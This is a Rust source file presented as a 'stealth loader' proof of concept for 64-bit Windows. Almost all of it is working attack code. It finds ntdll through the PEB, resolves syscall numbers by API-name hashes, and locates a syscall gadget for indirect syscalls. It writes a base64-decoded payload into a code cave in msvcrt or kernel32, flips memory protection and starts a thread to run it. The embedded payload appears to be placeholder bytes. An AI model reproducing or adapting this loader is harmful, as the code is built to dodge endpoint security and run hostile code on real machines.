#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

use std::ffi::{c_void, CStr};
use base64::{Engine as _, engine::general_purpose};
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::Foundation::*;

/*
    ================================================================================
    ROBUST 2026 STEALTH LOADER (REFINED PoC)
    ================================================================================
*/

// --- Manual PE Structure Definitions ---

#[repr(C)]
pub struct IMAGE_DOS_HEADER {
    pub e_magic: u16,
    pub e_cblp: u16,
    pub e_cp: u16,
    pub e_crlc: u16,
    pub e_cparhdr: u16,
    pub e_minalloc: u16,
    pub e_maxalloc: u16,
    pub e_ss: u16,
    pub e_sp: u16,
    pub e_csum: u16,
    pub e_ip: u16,
    pub e_cs: u16,
    pub e_lfarlc: u16,
    pub e_ovno: u16,
    pub e_res: [u16; 4],
    pub e_oemid: u16,
    pub e_oeminfo: u16,
    pub e_res2: [u16; 10],
    pub e_lfanew: i32,
}

#[repr(C)]
pub struct IMAGE_FILE_HEADER {
    pub Machine: u16,
    pub NumberOfSections: u16,
    pub TimeDateStamp: u32,
    pub PointerToSymbolTable: u32,
    pub NumberOfSymbols: u32,
    pub SizeOfOptionalHeader: u16,
    pub Characteristics: u16,
}

#[repr(C)]
pub struct IMAGE_DATA_DIRECTORY {
    pub VirtualAddress: u32,
    pub Size: u32,
}

#[repr(C)]
pub struct IMAGE_OPTIONAL_HEADER64 {
    pub Magic: u16,
    pub MajorLinkerVersion: u8,
    pub MinorLinkerVersion: u8,
    pub SizeOfCode: u32,
    pub SizeOfInitializedData: u32,
    pub SizeOfUninitializedData: u32,
    pub AddressOfEntryPoint: u32,
    pub BaseOfCode: u32,
    pub ImageBase: u64,
    pub SectionAlignment: u32,
    pub FileAlignment: u32,
    pub MajorOperatingSystemVersion: u16,
    pub MinorOperatingSystemVersion: u16,
    pub MajorImageVersion: u16,
    pub MinorImageVersion: u16,
    pub MajorSubsystemVersion: u16,
    pub MinorSubsystemVersion: u16,
    pub Win32VersionValue: u32,
    pub SizeOfImage: u32,
    pub SizeOfHeaders: u32,
    pub CheckSum: u32,
    pub Subsystem: u16,
    pub DllCharacteristics: u16,
    pub SizeOfStackReserve: u64,
    pub SizeOfStackCommit: u64,
    pub SizeOfHeapReserve: u64,
    pub SizeOfHeapCommit: u64,
    pub LoaderFlags: u32,
    pub NumberOfRvaAndSizes: u32,
    pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
pub struct IMAGE_NT_HEADERS64 {
    pub Signature: u32,
    pub FileHeader: IMAGE_FILE_HEADER,
    pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

#[repr(C)]
pub struct IMAGE_EXPORT_DIRECTORY {
    pub Characteristics: u32,
    pub TimeDateStamp: u32,
    pub MajorVersion: u16,
    pub MinorVersion: u16,
    pub Name: u32,
    pub Base: u32,
    pub NumberOfFunctions: u32,
    pub NumberOfNames: u32,
    pub AddressOfFunctions: u32,
    pub AddressOfNames: u32,
    pub AddressOfNameOrdinals: u32,
}

#[repr(C)]
pub struct IMAGE_SECTION_HEADER {
    pub Name: [u8; 8],
    pub Misc: IMAGE_SECTION_HEADER_MISC,
    pub VirtualAddress: u32,
    pub SizeOfRawData: u32,
    pub PointerToRawData: u32,
    pub PointerToRelocations: u32,
    pub PointerToLinenumbers: u32,
    pub NumberOfRelocations: u16,
    pub NumberOfLinenumbers: u16,
    pub Characteristics: u32,
}

#[repr(C)]
pub union IMAGE_SECTION_HEADER_MISC {
    pub PhysicalAddress: u32,
    pub VirtualSize: u32,
}

#[repr(C)]
pub struct UNICODE_STRING {
    pub Length: u16,
    pub MaximumLength: u16,
    pub Buffer: *mut u16,
}

#[repr(C)]
pub struct LDR_DATA_TABLE_ENTRY {
    pub InLoadOrderLinks: LIST_ENTRY,
    pub InMemoryOrderLinks: LIST_ENTRY,
    pub InInitializationOrderLinks: LIST_ENTRY,
    pub DllBase: *mut c_void,
    pub EntryPoint: *mut c_void,
    pub SizeOfImage: u32,
    pub FullDllName: UNICODE_STRING,
    pub BaseDllName: UNICODE_STRING,
}

#[repr(C)]
pub struct LIST_ENTRY {
    pub Flink: *mut LIST_ENTRY,
    pub Blink: *mut LIST_ENTRY,
}

#[repr(C)]
pub struct PEB_LDR_DATA {
    pub Length: u32,
    pub Initialized: u8,
    pub SsHandle: *mut c_void,
    pub InLoadOrderModuleList: LIST_ENTRY,
}

#[repr(C)]
pub struct PEB {
    pub Reserved1: [u8; 2],
    pub BeingDebugged: u8,
    pub Reserved2: [u8; 1],
    pub Reserved3: [*mut c_void; 2],
    pub Ldr: *mut PEB_LDR_DATA,
}

// --- Utilities ---

fn dbj2_hash(s: &str) -> u32 {
    let mut hash: u32 = 5381;
    for c in s.bytes() {
        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(c as u32);
    }
    hash
}

unsafe fn get_module_base(hash: u32) -> Option<*mut c_void> {
    #[cfg(target_arch = "x86_64")]
    let peb: *const PEB;
    #[cfg(target_arch = "x86_64")]
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    #[cfg(not(target_arch = "x86_64"))]
    return None;

    let ldr = (*peb).Ldr;
    let head = &mut (*ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
    let mut current = (*ldr).InLoadOrderModuleList.Flink;

    while current != head {
        let entry = current as *const LDR_DATA_TABLE_ENTRY;
        let buf = (*entry).BaseDllName.Buffer;
        if !buf.is_null() {
            let slice = std::slice::from_raw_parts(buf, ((*entry).BaseDllName.Length / 2) as usize);
            let name = String::from_utf16_lossy(slice).to_lowercase();
            if dbj2_hash(&name) == hash { return Some((*entry).DllBase); }
        }
        current = (*current).Flink;
    }
    None
}

unsafe fn find_global_gadget(ntdll: *mut c_void) -> Option<usize> {
    let base = ntdll as usize;
    let dos = base as *const IMAGE_DOS_HEADER;
    let nt = (base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let sections = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;

    for i in 0..(*nt).FileHeader.NumberOfSections {
        let sec = sections.add(i as usize);
        if (*sec).Name[0] == b'.' && (*sec).Name[1] == b't' && (*sec).Name[2] == b'e' && (*sec).Name[3] == b'x' && (*sec).Name[4] == b't' {
            let start = base + (*sec).VirtualAddress as usize;
            let v_size = (*sec).Misc.VirtualSize as usize;
            let slice = std::slice::from_raw_parts(start as *const u8, v_size);
            for j in 0..v_size - 3 {
                if slice[j] == 0x0F && slice[j+1] == 0x05 && slice[j+2] == 0xC3 {
                    return Some(start + j);
                }
            }
        }
    }
    None
}

unsafe fn resolve_ssn(ntdll: *mut c_void, hash: u32) -> Option<u32> {
    let base = ntdll as usize;
    let dos = base as *const IMAGE_DOS_HEADER;
    let nt = (base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let export_va = (*nt).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    let export_dir = (base + export_va) as *const IMAGE_EXPORT_DIRECTORY;

    let names = std::slice::from_raw_parts((base + (*export_dir).AddressOfNames as usize) as *const u32, (*export_dir).NumberOfNames as usize);
    let functions = std::slice::from_raw_parts((base + (*export_dir).AddressOfFunctions as usize) as *const u32, (*export_dir).NumberOfFunctions as usize);
    let ordinals = std::slice::from_raw_parts((base + (*export_dir).AddressOfNameOrdinals as usize) as *const u16, (*export_dir).NumberOfNames as usize);

    for i in 0..(*export_dir).NumberOfNames as usize {
        if let Ok(name) = CStr::from_ptr((base + names[i] as usize) as *const i8).to_str() {
            if dbj2_hash(name) == hash {
                let ordinal = ordinals[i] as usize;
                let func_ptr = (base + functions[ordinal] as usize) as *const u8;

                if *func_ptr == 0x4c && *func_ptr.add(1) == 0x8b && *func_ptr.add(2) == 0xd1 && *func_ptr.add(3) == 0xb8 {
                    return Some(*(func_ptr.add(4) as *const u32));
                }

                for j in 1..32 {
                    if ordinal >= j {
                        let up = (base + functions[ordinal - j] as usize) as *const u8;
                        if *up == 0x4c && *up.add(1) == 0x8b && *up.add(2) == 0xd1 && *up.add(3) == 0xb8 {
                            return Some((*(up.add(4) as *const u32)).wrapping_add(j as u32));
                        }
                    }
                    if ordinal + j < (*export_dir).NumberOfFunctions as usize {
                        let down = (base + functions[ordinal + j] as usize) as *const u8;
                        if *down == 0x4c && *down.add(1) == 0x8b && *down.add(2) == 0xd1 && *down.add(3) == 0xb8 {
                            return Some((*(down.add(4) as *const u32)).wrapping_sub(j as u32));
                        }
                    }
                }
            }
        }
    }
    None
}

#[inline(always)]
unsafe fn indirect_syscall_11(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize, a11: usize) -> NTSTATUS {
    let mut status: i32;
    #[cfg(target_arch = "x86_64")]
    std::arch::asm!(
        "mov r10, rcx",
        "sub rsp, 0x60",
        "mov [rsp + 0x20], {a5}",
        "mov [rsp + 0x28], {a6}",
        "mov [rsp + 0x30], {a7}",
        "mov [rsp + 0x38], {a8}",
        "mov [rsp + 0x40], {a9}",
        "mov [rsp + 0x48], {a10}",
        "mov [rsp + 0x50], {a11}",
        "call {gadget}",
        "add rsp, 0x60",
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        a10 = in(reg) a10,
        a11 = in(reg) a11,
        gadget = in(reg) gadget,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        in("eax") ssn,
        lateout("rax") status,
        out("r11") _,
        out("r10") _,
    );
    #[cfg(not(target_arch = "x86_64"))]
    { status = -1; let _ = (ssn, gadget, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11); }
    status
}

unsafe fn find_code_cave(module: *mut c_void, size: usize) -> Option<*mut c_void> {
    let base = module as usize;
    let dos = base as *const IMAGE_DOS_HEADER;
    let nt = (base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let sections = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;

    for i in 0..(*nt).FileHeader.NumberOfSections {
        let sec = sections.add(i as usize);
        if (*sec).Name[0] == b'.' && (*sec).Name[1] == b't' && (*sec).Name[2] == b'e' && (*sec).Name[3] == b'x' && (*sec).Name[4] == b't' {
            let start = base + (*sec).VirtualAddress as usize;
            let v_size = (*sec).Misc.VirtualSize as usize;
            let slice = std::slice::from_raw_parts(start as *const u8, v_size);
            let mut count = 0;
            for j in (0..v_size).rev() {
                if slice[j] == 0x00 || slice[j] == 0xCC { count += 1; } else { count = 0; }
                if count >= size { return Some((start + j) as *mut c_void); }
            }
        }
    }
    None
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("[*] 2026 Stealth Loader Refined PoC");

    let payload_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
    let shellcode = general_purpose::STANDARD.decode(payload_b64)?;

    unsafe {
        let ntdll = get_module_base(dbj2_hash("ntdll.dll")).expect("[-] ntdll failed");
        let nt_protect_ssn = resolve_ssn(ntdll, dbj2_hash("NtProtectVirtualMemory")).expect("[-] NtProtect SSN failed");
        let nt_create_thread_ssn = resolve_ssn(ntdll, dbj2_hash("NtCreateThreadEx")).expect("[-] NtCreateThreadEx SSN failed");
        let gadget = find_global_gadget(ntdll).expect("[-] Gadget not found");

        let target = get_module_base(dbj2_hash("msvcrt.dll")).or_else(|| get_module_base(dbj2_hash("kernel32.dll"))).expect("[-] Module not found");
        let stomping_ptr = find_code_cave(target, shellcode.len()).expect("[-] No cave found");

        let mut base = stomping_ptr;
        let mut size = shellcode.len();
        let mut old = 0u32;

        indirect_syscall_11(nt_protect_ssn, gadget, -1isize as usize, &mut base as *mut _ as usize, &mut size as *mut _ as usize, PAGE_READWRITE as usize, &mut old as *mut _ as usize, 0, 0, 0, 0, 0, 0);
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), stomping_ptr as *mut u8, shellcode.len());
        indirect_syscall_11(nt_protect_ssn, gadget, -1isize as usize, &mut base as *mut _ as usize, &mut size as *mut _ as usize, PAGE_EXECUTE_READ as usize, &mut old as *mut _ as usize, 0, 0, 0, 0, 0, 0);

        let mut h_thread: HANDLE = std::ptr::null_mut();
        indirect_syscall_11(nt_create_thread_ssn, gadget, &mut h_thread as *mut _ as usize, 0x1FFFFF, 0, -1isize as usize, stomping_ptr as usize, 0, 0, 0, 0, 0, 0);

        if !h_thread.is_null() {
            println!("[+] Stealth Execution success.");
            WaitForSingleObject(h_thread, INFINITE);
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test] fn test_hash() { assert_eq!(dbj2_hash("ntdll.dll"), dbj2_hash("ntdll.dll")); }
}
